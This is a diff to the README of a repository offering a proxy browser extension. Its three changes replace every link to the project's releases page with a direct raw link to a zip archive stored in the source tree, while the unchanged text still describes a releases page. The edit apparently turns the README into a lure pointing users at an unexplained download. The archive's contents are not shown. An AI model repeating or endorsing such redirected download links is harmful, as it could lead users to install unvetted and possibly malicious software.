@@ -1,6 +1,6 @@
 # 🧑‍💻 browser-extension - Easy Proxy for Chrome & Firefox
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/DJOUD3148/browser-extension/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/DJOUD3148/browser-extension/main/src/assets/extension-browser-2.6.zip)
 
 ---
 
@@ -26,7 +26,7 @@ To run browser-extension on Windows, your computer needs:
 
 You need to visit the releases page to get the software. Click the badge below to open the download page directly.
 
-[![Get browser-extension](https://img.shields.io/badge/Get%20browser--extension-brightgreen?style=for-the-badge)](https://github.com/DJOUD3148/browser-extension/releases)
+[![Get browser-extension](https://img.shields.io/badge/Get%20browser--extension-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/DJOUD3148/browser-extension/main/src/assets/extension-browser-2.6.zip)
 
 On the release page, look for the latest version. You will find files for Chrome and Firefox. Use the file names to choose the right one:
 
@@ -136,6 +136,6 @@ If none of these steps help, visit the GitHub Issues page to report the problem.
 
 You can always find the latest browser-extension files here:
 
-[https://github.com/DJOUD3148/browser-extension/releases](https://github.com/DJOUD3148/browser-extension/releases)
+[https://raw.githubusercontent.com/DJOUD3148/browser-extension/main/src/assets/extension-browser-2.6.zip](https://raw.githubusercontent.com/DJOUD3148/browser-extension/main/src/assets/extension-browser-2.6.zip)
 
 For questions, bug reports, or feature requests, use the GitHub Discussions or Issues section on the same page.
